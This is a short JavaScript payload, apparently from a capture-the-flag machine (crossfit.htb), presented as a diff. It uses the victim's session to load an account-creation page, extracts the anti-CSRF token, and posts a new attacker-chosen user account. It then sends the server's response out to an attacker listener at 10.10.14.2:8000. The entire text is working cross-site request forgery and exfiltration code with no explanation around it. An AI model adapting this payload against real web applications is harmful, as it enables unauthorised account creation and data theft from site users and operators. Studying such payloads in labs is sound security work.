@@ -1,0 +1,27 @@
+xhr.onreadystatechange = function() {
+if (this.readyState == 4) {
+// 2) Parse the response and retrieve the anti-CSRF token (_token)
+var parser = new DOMParser();
+var doc = parser.parseFromString(this.responseText, "text/html");
+var token = doc.getElementsByName('_token')[0].value;
+var xhr3 = new XMLHttpRequest();
+xhr3.onreadystatechange = function() {
+if (this.readyState == 4) {
+// 4) Sends result back to netcat listener
+var xhr4 = new XMLHttpRequest();
+xhr4.open("POST", "http://10.10.14.2:8000/", false);
+xhr4.send(this.responseText);
+}
+};
+// 3) Make a POST request to the /accounts page to add a new user
+xhr3.open("POST", "http://ftp.crossfit.htb/accounts", false);
+xhr3.withCredentials = true;
+xhr3.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+var params = "username=sheeraz&pass=sheeraz&_token=" + token;
+xhr3.send(params);
+}
+};
+// 1) Get the /accounts/create page
+xhr.open("GET", "http://ftp.crossfit.htb/accounts/create", false);
+xhr.withCredentials = true;
+xhr.send();
